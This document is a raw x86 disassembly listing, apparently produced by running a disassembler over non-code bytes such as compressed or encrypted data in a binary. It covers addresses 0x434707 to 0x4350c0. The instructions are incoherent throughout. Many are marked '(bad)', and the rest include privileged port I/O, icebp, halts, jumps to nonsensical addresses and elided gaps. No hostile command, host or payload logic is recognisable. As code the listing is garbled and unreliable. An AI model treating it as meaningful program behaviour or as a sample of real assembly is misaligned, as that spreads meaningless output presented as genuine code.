  434707:	xchg   BYTE PTR [ebx+esi*1+0x74d94c7f],ah
  43470e:	inc    ecx
  43470f:	in     al,0xed
  434711:	fmul   QWORD PTR [ebx+ecx*1]
  434714:	imul   eax,esp,0xffffffd9
  434717:	cli    
  434718:	into   
  434719:	jl     0x434763
  43471b:	cld    
  43471c:	jb     0x434724
  43471e:	xor    eax,0xfd45be51
  434723:	xchg   BYTE PTR [eax+eax*8],ch
  434726:	jle    0x43472f
  434728:	sbb    DWORD PTR [eax],eax
	...
  434742:	shl    DWORD PTR [eax+ecx*1],1
  434745:	jb     0x434759
  434747:	mov    cl,0x86
  434749:	icebp  
  43474a:	daa    
  43474b:	ficom  DWORD PTR [eax-0x1f]
  43474e:	cmp    al,0x41
  434750:	cld    
  434751:	mov    cs,WORD PTR [edx-0x43]
  434754:	xchg   cl,dh
  434756:	inc    edi
  434757:	ficom  DWORD PTR [eax-0x1f]
  43475a:	sub    al,0x41
  43475c:	loopne 0x4347c0
  43475e:	lahf   
  43475f:	inc    ebp
  434760:	sti    
  434761:	sbb    BYTE PTR [eax+0xc65447e],bl
  434767:	dec    BYTE PTR [edi+0x5e]
  43476a:	es or  eax,0x5f8fb487
  434770:	push   esp
  434771:	mov    cl,0x9f
  434773:	push   edx
  434774:	lock inc esi
  434776:	pop    eax
  434777:	fidiv  DWORD PTR [ecx+ebx*1+0x50]
  43477b:	lock mov bh,0xdb
  43477e:	mov    bh,0x4
  434780:	pop    ebx
  434781:	(bad)  
  434782:	lods   al,BYTE PTR ds:[esi]
  434783:	retf   
  434784:	mov    esi,0x80e9ccbc
  434789:	or     eax,0xe900048b
  43478e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43478f:	xor    dl,BYTE PTR [ebx-0x7f]
  434792:	(bad)  
  434793:	icebp  
  434794:	aas    
  434795:	add    BYTE PTR ds:0x5d179039,bl
  43479b:	add    eax,ebp
  43479d:	and    al,BYTE PTR [ecx+0x1]
  4347a0:	add    BYTE PTR [ebx-0x1f83a4db],cl
	...
  4347be:	add    BYTE PTR [eax-0x357bfa1f],ah
  4347c4:	(bad)  
  4347c5:	(bad)  
  4347c6:	push   DWORD PTR [edi+0x3d758d18]
  4347cc:	sbb    al,ch
  4347ce:	sbb    cl,BYTE PTR [edx-0x18]
  4347d1:	cmc    
  4347d2:	push   0x14
  4347d4:	jbe    0x434849
  4347d6:	in     al,0x5
  4347d8:	loope  0x4347df
  4347da:	outs   dx,DWORD PTR ds:[esi]
  4347db:	mov    ch,al
  4347dd:	add    DWORD PTR [edi],0xf45e5e
  4347e3:	inc    esi
  4347e4:	mov    bh,0x4f
  4347e6:	lea    ebx,[eax]
  4347e8:	cdq    
  4347e9:	dec    edi
  4347ea:	push   edi
  4347eb:	push   0x19
  4347ed:	or     al,0x85
  4347ef:	pop    ebp
  4347f0:	clc    
  4347f1:	test   BYTE PTR [edi],bl
  4347f3:	pushf  
  4347f4:	or     BYTE PTR [eax],al
  4347f6:	mov    edx,DWORD PTR [edx-0x307b48b]
  4347fc:	maskmovq mm2,(bad)
  4347fd:	not    DWORD PTR [eax-0x3]
  434800:	jge    0x4347bc
  434802:	movups xmm6,xmm6
  434805:	add    BYTE PTR [eax],al
  434807:	lea    esp,[edx+0x52]
  43480a:	lea    esp,[eax+0x39]
  43480d:	idiv   edi
  43480f:	mov    edx,0x3bd6e810
  434814:	out    0xf5,eax
  434816:	mov    edx,DWORD PTR [eax+0x7d0881b0]
  43481c:	out    0x4f,eax
  43481e:	or     al,0xe4
  434820:	(bad)  
  434821:	cli    
  434822:	inc    DWORD PTR [eax]
	...
  43483c:	pop    ebp
  43483d:	jne    0x434892
  43483f:	in     al,dx
  434840:	hlt    
  434841:	(bad)  
  434842:	cs sti 
  434844:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  434845:	fld    DWORD PTR [edi-0x389efc41]
  43484b:	jmp    FWORD PTR [ebx]
  43484d:	fimul  WORD PTR [ecx+0xc671044]
  434853:	(bad)  
  434854:	ror    ebp,0x34
  434857:	push   0x3ed374
  43485c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43485d:	mov    dl,0xf3
  43485f:	test   BYTE PTR [ebx+ebp*8],dh
  434862:	xchg   DWORD PTR [esp+esi*8+0x39c1fedd],esp
  434869:	retf   
  43486a:	add    ecx,DWORD PTR [ebx]
  43486c:	mov    ds:0x714fdf28,al
  434871:	pusha  
  434872:	dec    edi
  434873:	sti    
  434874:	(bad)  [edx+0x4708662e]
  43487a:	xchg   ecx,eax
  43487b:	mov    esp,0xfadd72fc
  434880:	int3   
  434881:	out    dx,eax
  434882:	mov    dh,0xfa
  434884:	mov    ebx,0xb4853d14
  434889:	or     ebx,DWORD PTR [ecx-0x79]
  43488c:	xor    DWORD PTR [esi+0x6d],ecx
  43488f:	fs aas 
  434891:	imul   edi,DWORD PTR [eax],0x90ef46e8
  434897:	xchg   esp,eax
  434898:	xor    al,0x6c
  43489a:	fdivp  st(2),st
  43489c:	es mov eax,0x86fe
	...
  4348b6:	add    BYTE PTR [eax],al
  4348b8:	add    BYTE PTR [ebx-0x73a37471],ch
  4348be:	popw   es
  4348c0:	push   eax
  4348c1:	jae    0x43492f
  4348c3:	or     al,BYTE PTR [ebp+0x66199834]
  4348c9:	mov    ah,0x68
  4348cb:	mov    BYTE PTR [edi],bh
  4348cd:	pop    edx
  4348ce:	and    bl,dh
  4348d0:	dec    edi
  4348d1:	push   ebx
  4348d2:	add    al,0xfc
  4348d4:	push   ebx
  4348d5:	sti    
  4348d6:	inc    esp
  4348d7:	jmp    0xd79bcc64
  4348dc:	nop
  4348dd:	jo     0x434923
  4348df:	or     esp,edx
  4348e1:	cs xor al,0x66
  4348e4:	retf   
  4348e5:	sub    DWORD PTR cs:[ebx+0x18f01bd7],0x28881ee2
  4348f0:	push   edi
  4348f1:	lock pop ss
  4348f3:	test   eax,0x2880a86c
  4348f8:	add    al,0xb4
  4348fa:	and    DWORD PTR [ebx],0xb8fc13d8
  434900:	loope  0x4348f0
  434902:	fsubp  st(6),st
  434904:	test   bl,ah
  434906:	dec    edi
  434907:	xor    eax,0xe7cd6307
  43490c:	push   esi
  43490d:	call   0xc246ce4
  434912:	xor    BYTE PTR [edx-0x65a189ef],ah
  434918:	loope  0x4348d8
  43491a:	jle    0x434947
  43491c:	aam    0x0
	...
  434936:	jb     0x434935
  434938:	cmp    cl,ah
  43493a:	inc    esp
  43493b:	std    
  43493c:	ins    DWORD PTR es:[edi],dx
  43493d:	pop    edi
  43493e:	xchg   esp,eax
  43493f:	jle    0x434964
  434941:	lock jp 0x434941
  434944:	sbb    cl,ah
  434946:	inc    esp
  434947:	std    
  434948:	pop    ebp
  434949:	inc    edi
  43494a:	mov    WORD PTR [esi-0x10],?
  43494d:	xor    ecx,DWORD PTR [edi+0x4386f934]
  434953:	jle    0x434900
  434955:	(bad)  [edx-0x3]
  434958:	fld    DWORD PTR [edi-0x1ebe2dfe]
  43495e:	mov    ebx,0x7b0b97d1
  434963:	or     al,BYTE PTR [eax]
  434965:	sahf   
  434966:	push   esp
  434967:	inc    edx
  434968:	or     BYTE PTR [edx+0x13],ah
  43496b:	fldenv [ebp-0x42]
  43496e:	paddusw mm3,mm5
  434971:	andnps xmm1,xmm7
  434974:	pop    edx
  434975:	mov    bh,0xf8
  434977:	mov    ebx,0x711fb8be
  43497c:	and    al,0xe9
  43497e:	not    DWORD PTR [eax]
  434980:	add    al,0x7b
  434982:	add    eax,0x3a01006b
  434987:	fdivr  st,st(2)
  434989:	out    dx,al
  43498a:	pop    ds
  43498b:	sub    al,0xfa
  43498d:	out    0x14,al
  43498f:	jmp    0x434996
  434991:	shl    DWORD PTR [ebp-0x2a],1
  434994:	cli    
  434995:	(bad)  
  434996:	ud2    
  434998:	cld    
  434999:	into   
	...
  4349b2:	add    ah,dl
  4349b4:	jmp    0xcf180540
  4349b9:	gs call 0xb738fa8e
  4349bf:	aam    0x2c
  4349c1:	mov    edi,0x84d98116
  4349c6:	mov    ebx,0x560b1c23
  4349cb:	stc    
  4349cc:	test   WORD PTR [ecx-0x6e80dbdd],bp
  4349d3:	pop    es
  4349d4:	pop    eax
  4349d5:	adc    eax,0xfe0f8cf6
  4349da:	imul   edi,DWORD PTR [edi+0x70ec7459],0xfcf457d9
  4349e4:	fdiv   QWORD PTR [ecx+0x5ace9620]
  4349ea:	sub    cl,BYTE PTR [edi-0x816fff9]
  4349f0:	sub    eax,0x51c6abf
  4349f5:	data16 add BYTE PTR [ebp+0xd],ah
  4349f9:	push   edi
  4349fa:	ret    
  4349fb:	mov    edi,eax
  4349fd:	in     eax,dx
  4349fe:	cmp    edi,ebx
  434a00:	cmp    DWORD PTR [esi],edi
  434a02:	bswap  edx
  434a04:	call   FWORD PTR [ebp+0x3b]
  434a07:	add    edi,DWORD PTR [edx]
  434a09:	xor    ecx,DWORD PTR ss:0x582df789
  434a10:	or     ah,BYTE PTR [edx+0x2]
  434a13:	gs loopne 0x434a23
  434a16:	add    DWORD PTR [eax],0x0
	...
  434a2d:	add    BYTE PTR [eax],al
  434a2f:	add    ah,dh
  434a31:	and    BYTE PTR [ebp+0x15],dh
  434a34:	push   es
  434a35:	(bad)  
  434a36:	pusha  
  434a37:	and    DWORD PTR [ebx+ebp*8],0x6e
  434a3b:	adc    eax,0xf04ab76
  434a40:	push   0xffffffbf
  434a42:	mov    esi,DWORD PTR [ebx+edx*1-0x6b]
  434a46:	jns    0x434a0a
  434a48:	lar    ebp,WORD PTR [edi+0x2ab25e0a]
  434a4f:	jae    0x434a09
  434a51:	addr16 test ecx,ecx
  434a54:	sub    DWORD PTR [ebx+edi*2],eax
  434a57:	enter  0x9ccc,0xfc
  434a5b:	jae    0x434a37
  434a5d:	mov    bh,0xd8
  434a5f:	jmp    0x434a3f
  434a61:	pop    esi
  434a62:	or     BYTE PTR [eax+0x44],bl
  434a65:	clc    
  434a66:	push   ebp
  434a67:	ret    
  434a68:	clc    
  434a69:	jnp    0x434a51
  434a6b:	xor    DWORD PTR [ecx],0xffffffd9
  434a6e:	dec    ecx
  434a6f:	push   esi
  434a70:	or     dh,ah
  434a72:	test   BYTE PTR [ebx+0x87cf21d],0x99
  434a79:	ds dec edi
  434a7b:	push   0x955
  434a80:	adc    ch,BYTE PTR [esi]
  434a82:	or     BYTE PTR [ebp-0x3b1d4fc0],cl
  434a88:	hlt    
  434a89:	rcr    ecx,1
  434a8b:	cli    
  434a8c:	jge    0x434a37
  434a8e:	shl    BYTE PTR [esi],cl
  434a90:	xor    edx,edi
  434a92:	sub    BYTE PTR [edi+0x0],0x0
	...
  434aad:	cmc    
  434aae:	(bad)  
  434ab0:	xchg   BYTE PTR [ecx-0x140880e7],dh
  434ab6:	scas   al,BYTE PTR es:[edi]
  434ab7:	and    BYTE PTR [ebx+0x65feddf5],0xeb
  434abe:	stos   BYTE PTR es:[edi],al
  434abf:	mov    al,0x58
  434ac1:	inc    ebx
  434ac2:	in     eax,dx
  434ac3:	push   ss
  434ac4:	rol    DWORD PTR [ebx],cl
  434ac6:	imul   edi,DWORD PTR [ecx+0x0],0x6631ddf4
  434acd:	cwde   
  434ace:	into   
  434acf:	push   edi
  434ad0:	or     BYTE PTR [ecx+0x79],ch
  434ad3:	(bad)  
  434ad4:	mov    BYTE PTR [ecx-0x1f73191f],bh
  434ada:	out    0xd9,al
  434adc:	out    0xd6,al
  434ade:	pusha  
  434adf:	dec    eax
  434ae0:	cld    
  434ae1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  434ae2:	(bad)
  434ae5:	repnz mov esi,0x2e0448b
  434aeb:	ret    
  434aec:	or     bh,BYTE PTR [eax+0x3f]
  434aef:	add    eax,0x4868f400
  434af4:	clc    
  434af5:	and    al,0x46
  434af7:	jl     0x434af8
  434af9:	retf   
  434afa:	fucom  st(6)
  434afc:	fsubr  QWORD PTR cs:[edi-0x27]
  434b00:	xchg   BYTE PTR [eax+eiz*2+0x25780ada],bh
  434b07:	add    eax,0x605af400
  434b0c:	clc    
  434b0d:	in     al,0xde
  434b0f:	cmp    BYTE PTR [ecx],0x0
	...
  434b2a:	cmc    
  434b2b:	(bad)  
  434b2d:	xchg   BYTE PTR [ecx],bh
  434b2f:	push   esi
  434b30:	xor    ch,al
  434b32:	add    al,BYTE PTR ds:0x89f403b7
  434b38:	sub    BYTE PTR [esi],cl
  434b3a:	outs   dx,BYTE PTR ds:[esi]
  434b3b:	and    eax,ebp
  434b3d:	add    esi,esp
  434b3f:	or     ebx,0xb
  434b42:	hlt    
  434b43:	pop    eax
  434b44:	cld    
  434b45:	xor    eax,0x3e2b04c
  434b4a:	hlt    
  434b4b:	mov    BYTE PTR [eax],ch
  434b4d:	pop    eax
  434b4e:	out    0x13,eax
  434b50:	xor    ebx,esi
  434b52:	rcr    al,0x10
  434b55:	fstp   DWORD PTR [eax-0x31]
  434b58:	sbb    DWORD PTR [esi],esi
  434b5a:	dec    esp
  434b5b:	fmul   DWORD PTR [ebx]
  434b5d:	fisubr WORD PTR [esi]
  434b5f:	jnp    0x434b83
  434b61:	in     al,dx
  434b62:	push   es
  434b63:	push   es
  434b64:	jmp    0xf59c6a6c
  434b69:	mov    DWORD PTR [eax-0x1085ff30],esi
  434b6f:	into   
  434b70:	jmp    0x3a0fcc52
  434b75:	in     al,dx
  434b76:	or     ch,bl
  434b78:	fcmovu st,st(5)
  434b7a:	jb     0x434bc5
  434b7c:	aad    0x69
  434b7e:	mov    ah,0x1
  434b80:	les    esp,FWORD PTR fs:[edi+0x1]
  434b84:	shl    DWORD PTR [ebp-0x28],1
  434b87:	into   
  434b88:	mov    ecx,0x6bfd308b
  434b8d:	les    eax,FWORD PTR [eax]
	...
  434ba7:	dec    eax
  434ba8:	or     BYTE PTR [edi],bh
  434baa:	fisubr WORD PTR ds:0x1d8f64da
  434bb0:	std    
  434bb1:	xor    eax,0xf6ece0dd
  434bb6:	inc    ebx
  434bb7:	hlt    
  434bb8:	jns    0x434b5c
  434bba:	in     al,dx
  434bbb:	fild   DWORD PTR [ecx]
  434bbd:	jmp    0x758bc6c5
  434bc2:	mov    esi,DWORD PTR ds:0x3b62001d
  434bc8:	ror    DWORD PTR [eax+0x4485c427],1
  434bce:	icebp  
  434bcf:	outs   dx,BYTE PTR ds:[esi]
  434bd0:	inc    esp
  434bd1:	xor    BYTE PTR [ecx+0x3],dl
  434bd4:	popa   
  434bd5:	sti    
  434bd6:	push   esi
  434bd7:	add    eax,0x4bd4f2bf
  434bdc:	xchg   DWORD PTR [ecx+eax*2+0x25],eax
  434be0:	jl     0x434c5b
  434be2:	or     DWORD PTR [edi+0x44],ebp
  434be5:	and    al,0x60
  434be7:	or     bl,BYTE PTR [ecx]
  434be9:	sti    
  434bea:	aam    0x4b
  434bec:	add    BYTE PTR [eax-0x17],al
  434bef:	in     al,0xc9
  434bf1:	cmp    BYTE PTR [edi-0x41e1a825],bl
  434bf7:	call   0x23519f2d
  434bfc:	adc    dl,BYTE PTR [ecx]
  434bfe:	test   eax,0xbd417bf7
  434c03:	cld    
  434c04:	shl    DWORD PTR [eax+ebx*8-0x38],0xdc
  434c09:	pop    edi
  434c0a:	add    al,0x0
	...
  434c24:	sub    ebx,ecx
  434c26:	push   edx
  434c27:	sar    DWORD PTR [ebp-0x72210519],1
  434c2d:	retf   0xc257
  434c30:	push   eax
  434c31:	retf   0xd71
  434c34:	leave  
  434c35:	clc    
  434c36:	scas   eax,DWORD PTR es:[edi]
  434c37:	(bad)  [edi]
  434c39:	add    eax,0x85f81f8d
  434c3e:	(bad)  
  434c3f:	icebp  
  434c40:	mov    eax,0x3a5c1e51
  434c45:	std    
  434c46:	push   eax
  434c47:	cmp    DWORD PTR [ecx+0x37f8a3f8],esp
  434c4d:	add    eax,0xfe4ba985
  434c52:	or     BYTE PTR [eax+edi*8],0xcd
  434c56:	(bad)  
  434c57:	dec    DWORD PTR [ebp+0x1a0a7401]
  434c5d:	cmc    
  434c5e:	not    BYTE PTR ds:0x3ad4a1
  434c64:	adc    al,0xed
  434c66:	cmp    BYTE PTR [ebx],bh
  434c68:	mov    al,ds:0x917e8326
  434c6d:	adc    al,0x4e
  434c6f:	push   0x3d4f37
  434c74:	xor    eax,0x4d080001
  434c79:	fstp   DWORD PTR [ebp+0x7eb11bad]
  434c7f:	rcl    BYTE PTR [eax-0x4aff9e04],0xaf
  434c86:	fdivp  st(7),st
	...
  434ca0:	add    BYTE PTR [edx],bl
  434ca2:	pop    esp
  434ca3:	add    bl,ch
  434ca5:	jbe    0x434c9b
  434ca7:	not    BYTE PTR [edi-0xb]
  434caa:	mov    bl,0xde
  434cac:	(bad)  
  434cad:	cli    
  434cae:	sbb    al,ch
  434cb0:	in     al,dx
  434cb1:	icebp  
  434cb2:	mov    al,0xf5
  434cb4:	xor    ecx,ebp
  434cb6:	inc    ecx
  434cb7:	jecxz  0x434cca
  434cb9:	or     dh,BYTE PTR [edi]
  434cbb:	hlt    
  434cbc:	call   0x3932bb
  434cc1:	ret    0xd7e0
  434cc4:	in     al,0x1a
  434cc6:	test   eax,0x10cac879
  434ccb:	push   esi
  434ccc:	pop    ebx
  434ccd:	xchg   esp,eax
  434cce:	ret    
  434ccf:	(bad)  
  434cd0:	inc    DWORD PTR [eax]
  434cd2:	jl     0x434cba
  434cd4:	push   ecx
  434cd5:	cld    
  434cd6:	adc    ecx,DWORD PTR [edi-0x73]
  434cd9:	or     edi,ecx
  434cdb:	dec    esi
  434cdc:	mov    DWORD PTR [eax],ebx
  434cde:	test   eax,0xd2f515f5
  434ce3:	cmp    al,BYTE PTR [eax]
  434ce5:	sahf   
  434ce6:	mov    esi,DWORD PTR [edi]
  434ce8:	pop    esi
  434ce9:	hlt    
  434cea:	lds    ecx,FWORD PTR [edx+0x74]
  434ced:	jg     0x434d13
  434cef:	sub    BYTE PTR [edi],dh
  434cf1:	mov    bh,0xca
  434cf3:	mov    DWORD PTR [bx+di],edi
  434cf6:	dec    edx
  434cf7:	dec    esi
  434cf8:	xor    dl,BYTE PTR [ebx+0x3287101c]
  434cfe:	xchg   edx,eax
  434cff:	adc    esi,ecx
  434d01:	mov    ebp,DWORD PTR [edx+eiz*1+0x89]
	...
  434d1c:	add    BYTE PTR [eax],al
  434d1e:	and    dh,dl
  434d20:	push   0xffffffce
  434d22:	add    bh,bl
  434d24:	xor    BYTE PTR [eax],dh
  434d26:	jg     0x434d60
  434d28:	sbb    eax,0x2689ec5b
  434d2d:	sti    
  434d2e:	add    esi,esp
  434d30:	icebp  
  434d31:	aas    
  434d32:	hlt    
  434d33:	push   es
  434d34:	aas    
  434d35:	or     BYTE PTR [ecx],cl
  434d37:	ds jae 0x434d3d
  434d3a:	hlt    
  434d3b:	outs   dx,BYTE PTR ds:[esi]
  434d3c:	out    dx,al
  434d3d:	cli    
  434d3e:	mov    cl,0xe9
  434d40:	mov    al,BYTE PTR [eax+esi*1-0x49]
  434d44:	inc    eax
  434d45:	sub    al,0xa6
  434d47:	daa    
  434d48:	xlat   BYTE PTR ds:[ebx]
  434d49:	je     0x434d67
  434d4b:	mul    DWORD PTR ds:0x3754fb89
  434d51:	add    al,0x7d
  434d53:	jae    0x434d5b
  434d55:	xchg   DWORD PTR [edx-0x143f966f],esi
  434d5b:	fiadd  WORD PTR [eax+0x28]
  434d5e:	mov    ss,edx
  434d60:	cs sti 
  434d62:	imul   esp,esi,0xd43814d5
  434d68:	add    BYTE PTR ds:[edi-0x67],dh
  434d6c:	add    bh,bl
  434d6e:	popa   
  434d6f:	(bad)  
  434d70:	aad    0x14
  434d72:	lock scas eax,DWORD PTR es:[edi]
  434d74:	add    BYTE PTR ds:[esp+ebx*8+0x52b08e9],al
  434d7c:	mov    ds:0x28f6dff0,al
  434d81:	add    al,0x0
	...
  434d9b:	loop   0x434d61
  434d9d:	xor    DWORD PTR [edi],edi
  434d9f:	mov    ebp,0x4903e4c6
  434da4:	adc    BYTE PTR [esi+eax*4+0x3315f48f],0xb6
  434dac:	inc    ecx
  434dad:	jb     0x434db2
  434daf:	(bad)  
  434db0:	icebp  
  434db1:	shl    dh,1
  434db3:	ret    
  434db4:	add    al,0x6e
  434db6:	fld    TBYTE PTR [eax+0x42]
  434db9:	icebp  
  434dba:	xor    edi,DWORD PTR [ebp+0x41]
  434dbd:	pop    ecx
  434dbe:	fiadd  DWORD PTR [eax]
  434dc0:	in     eax,dx
  434dc1:	test   BYTE PTR [ebx-0xc],0x17
  434dc5:	push   ds
  434dc6:	mov    WORD PTR [eax+0x2039ffcc],?
  434dcc:	push   ebx
  434dcd:	mov    dl,0x8e
  434dcf:	mov    al,0xfc
  434dd1:	gs ret 
  434dd3:	idiv   DWORD PTR [ebp-0x55]
  434dd6:	iret   
  434dd7:	ins    BYTE PTR es:[edi],dx
  434dd8:	sub    ecx,esi
  434dda:	mov    ?,WORD PTR [ebp+0x78f67f1c]
  434de0:	inc    eax
  434de1:	icebp  
  434de2:	push   DWORD PTR [ebx+0x1ecf7bcb]
  434de8:	icebp  
  434de9:	mov    al,ds:0x6604d3f1
  434dee:	mov    edi,0x502881ff
  434df3:	mov    bh,0x7f
  434df5:	sub    dl,BYTE PTR [ebx+edi*8]
  434df8:	aas    
  434df9:	icebp  
  434dfa:	xor    DWORD PTR [eax-0x7],0xffffffe8
  434dfe:	dec    esi
	...
  434e17:	add    al,bh
  434e19:	adc    eax,0x7bfb8ba0
  434e1e:	xor    BYTE PTR [eax],al
  434e20:	ins    DWORD PTR es:[edi],dx
  434e21:	cmp    eax,0x7e1aecf1
  434e26:	jmp    eax
  434e28:	dec    edx
  434e29:	mov    ebp,0xb770dd73
  434e2e:	es mov eax,0xfa87d077
  434e34:	test   DWORD PTR [esi+ebp*2],0x40accf4
  434e3b:	add    esp,DWORD PTR [ebx-0x13e76d3]
  434e41:	cmp    al,0x4
  434e43:	sti    
  434e44:	(bad)  
  434e45:	jnp    0x434ebe
  434e47:	loope  0x434ec7
  434e49:	inc    edx
  434e4a:	add    al,0x82
  434e4c:	hlt    
  434e4d:	dec    ecx
  434e4e:	pusha  
  434e4f:	icebp  
  434e50:	test   esi,0xcdf75e44
  434e56:	inc    esp
  434e57:	push   ecx
  434e58:	jns    0x434e9b
  434e5a:	clc    
  434e5b:	push   0x23
  434e5d:	std    
  434e5e:	or     ebp,DWORD PTR [edx+0x31]
  434e61:	div    DWORD PTR [esi]
  434e63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  434e64:	sbb    ebx,DWORD PTR [ebx-0x73]
  434e67:	ss mov ebx,0x4bd4fad4
  434e6d:	clc    
  434e6e:	aas    
  434e6f:	jmp    0xbf3e8fdd
  434e74:	lock mov ebx,0x2ff7e1bd
  434e7a:	xchg   ebp,edi
	...
  434e94:	add    BYTE PTR [eax-0x1a],bh
  434e97:	imul   DWORD PTR [edx+0xc]
  434e9a:	cli    
  434e9b:	xchg   dl,ch
  434e9d:	or     BYTE PTR [edx-0x70],0xe8
  434ea1:	test   DWORD PTR [edx+edx*2],0xc20b460
  434ea8:	jb     0x434e5a
  434eaa:	or     BYTE PTR [ebx+0x70],dl
  434ead:	xor    esp,DWORD PTR [ecx]
  434eaf:	adc    al,0x6a
  434eb1:	mov    ebp,0xf84351ce
  434eb6:	ja     0x434efb
  434eb8:	add    cl,ch
  434eba:	enter  0x6a4a,0xdf
  434ebe:	lods   al,BYTE PTR ds:[esi]
  434ebf:	adc    edi,esp
  434ec1:	lods   eax,DWORD PTR ds:[esi]
  434ec2:	inc    ebp
  434ec3:	add    BYTE PTR ds:0x6cf,bh
  434ec9:	fscale 
  434ecb:	jp     0x434ec5
  434ecd:	pushf  
  434ece:	cld    
  434ecf:	test   BYTE PTR [ecx-0x7cfffa63],ah
  434ed5:	stc    
  434ed6:	and    al,0x8
  434ed8:	add    BYTE PTR [esi-0x3b],bl
  434edb:	mov    edi,DWORD PTR [ecx+edi*4+0x1]
  434edf:	mov    ds:0x4ff8de8d,eax
  434ee4:	jmp    FWORD PTR [eax-0x72bff333]
  434eea:	js     0x434f25
  434eec:	and    al,bl
  434eee:	lds    ebp,FWORD PTR [esi+0x22]
  434ef1:	(bad)  
  434ef2:	cmp    BYTE PTR [eax*4+0x51133a14],ah
	...
  434f11:	add    BYTE PTR [ebp-0x23],bh
  434f14:	ins    DWORD PTR es:[edi],dx
  434f15:	jecxz  0x434f29
  434f17:	lods   eax,DWORD PTR ds:[esi]
  434f18:	cmp    eax,0x892440d6
  434f1e:	cdq    
  434f1f:	jmp    0x3b55d42f
  434f24:	push   es
  434f25:	mov    esi,0xa3c9d
  434f2a:	test   BYTE PTR [ebx+eax*4],0x7c
  434f2e:	cmp    ebp,edi
  434f30:	jp     0x434f00
  434f32:	repnz cmp BYTE PTR [ecx],0x8
  434f36:	ins    DWORD PTR es:[edi],dx
  434f37:	lods   al,BYTE PTR ds:[esi]
  434f38:	adc    ebx,DWORD PTR [edi+ebp*1]
  434f3b:	inc    ebp
  434f3c:	add    BYTE PTR [ebp+0x538c3a12],al
  434f42:	and    eax,0xddfff9a2
  434f47:	dec    eax
  434f48:	mov    ebx,0x65f1f474
  434f4d:	add    BYTE PTR [edi-0x3a],al
  434f50:	jbe    0x434f51
  434f52:	fcmovnu st,st(6)
  434f54:	jp     0x434f15
  434f56:	dec    eax
  434f57:	into   
  434f58:	shl    DWORD PTR [ebx+0x10],1
  434f5b:	loop   0x434f86
  434f5d:	data16 clc 
  434f5f:	inc    ebx
  434f60:	add    al,0x66
  434f62:	push   es
  434f63:	lahf   
  434f64:	push   cs
  434f65:	call   0xfb166c30
  434f6a:	sti    
  434f6b:	daa    
  434f6c:	aam    0xf2
  434f6e:	ret    0xccd3
  434f71:	adc    BYTE PTR [edx+0x2371de],0x0
	...
  434f8c:	add    BYTE PTR [eax],al
  434f8e:	add    ah,dh
  434f90:	pop    esp
  434f91:	mov    edx,0xfeac3b7f
  434f96:	push   edx
  434f97:	mov    WORD PTR [edi],?
  434f99:	fdivp  st(2),st
  434f9b:	jnp    0x434fd2
  434f9d:	cmp    bh,bl
  434f9f:	jae    0x434fc8
  434fa1:	xchg   edx,eax
  434fa2:	jg     0x434f5f
  434fa4:	retf   
  434fa5:	(bad)  
  434fa6:	out    0x52,al
  434fa8:	xchg   edi,eax
  434fa9:	xor    al,0x87
  434fab:	push   ecx
  434fac:	mov    eax,ds:0x6a7f4ebd
  434fb1:	sbb    cl,BYTE PTR [eax]
  434fb3:	pop    esp
  434fb4:	loopne 0x434f87
  434fb6:	cli    
  434fb7:	inc    ebx
  434fb8:	retf   
  434fb9:	mov    esi,0xfeda3656
  434fbe:	dec    esi
  434fbf:	retf   0xd452
  434fc2:	push   edx
  434fc3:	jns    0x434f55
  434fc5:	push   es
  434fc6:	dec    edi
  434fc7:	and    edx,ecx
  434fc9:	test   BYTE PTR ds:0x7987ddb4,0xdc
  434fd0:	(bad)  
  434fd1:	or     eax,ebp
  434fd3:	nop
  434fd4:	sti    
  434fd5:	sar    dl,cl
  434fd7:	add    edx,DWORD PTR [eax+0xf]
  434fda:	call   0xd70a5477
  434fdf:	out    dx,al
  434fe0:	pop    edx
  434fe1:	stc    
  434fe2:	cmp    esi,DWORD PTR [esi+0x2c3ee8ff]
  434fe8:	push   edx
  434fe9:	rol    BYTE PTR [edx+0xdc224b5],1
  434fef:	fdivr  QWORD PTR [edi+eax*8]
  434ff2:	(bad)  
	...
  43500b:	add    dh,cl
  43500d:	pop    edx
  43500e:	loope  0x43504b
  435010:	mov    dh,0xfe
  435012:	call   0xa0957c54
  435017:	xor    ch,BYTE PTR [edi-0x140e030f]
  43501d:	add    al,0x32
  43501f:	ss dec ebx
  435021:	les    esi,FWORD PTR [ebx]
  435023:	mov    ecx,DWORD PTR [edi-0xae86b7b]
  435029:	add    al,0xe9
  43502b:	xor    ah,BYTE PTR [esi]
  43502d:	xor    BYTE PTR [esi+0x58],bl
  435030:	in     al,dx
  435031:	jnp    0x435014
  435033:	mov    ah,BYTE PTR [ebx+0x74]
  435036:	out    0x3,eax
  435038:	hlt    
  435039:	mov    esi,0x786bd6a3
  43503e:	stos   DWORD PTR es:[edi],eax
  43503f:	fbstp  TBYTE PTR [ebx+0x1deb517b]
  435045:	retf   0xd641
  435048:	ja     0x43500e
  43504a:	jmp    0xe947e8ce
  43504f:	add    edi,DWORD PTR [edx+0x41]
  435052:	inc    ecx
  435053:	jmp    0x43500b
  435055:	jnp    0x435078
  435057:	(bad)  
  435058:	jp     0x43502e
  43505a:	gs aad 0x29
  43505d:	push   eax
  43505e:	in     eax,dx
  43505f:	imul   eax,DWORD PTR [esp+ebx*8],0xef1d82e1
  435066:	jnp    0x435068
  435068:	call   0x12:0x9eaa0e8
  43506f:	sub    DWORD PTR [eax],eax
	...
  435089:	(bad)  
  43508a:	jns    0x4350d0
  43508c:	inc    ecx
  43508d:	lea    eax,[eax+edx*2]
  435090:	out    0xe3,al
  435092:	adc    ch,BYTE PTR ss:[ecx]
  435095:	lock inc ebp
  435097:	(bad)  
  435098:	in     eax,0x41
  43509a:	jl     0x435110
  43509c:	xor    DWORD PTR [edx],0x74e3743b
  4350a2:	fcom   QWORD PTR [esp+esi*1]
  4350a5:	cs pop edi
  4350a7:	adc    BYTE PTR [ebx+eax*1-0x24],ah
  4350ab:	dec    edi
  4350ac:	pop    esp
  4350ad:	sti    
  4350ae:	xchg   esp,eax
  4350af:	dec    edi
  4350b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4350b1:	mov    ds:0xf029123a,eax
  4350b6:	inc    ebp
  4350b7:	(bad)  
  4350b8:	in     eax,0x8c
  4350ba:	add    al,0x87
  4350bc:	and    al,0x8f
  4350be:	jge    0x435104
  4350c0:	push   ebp
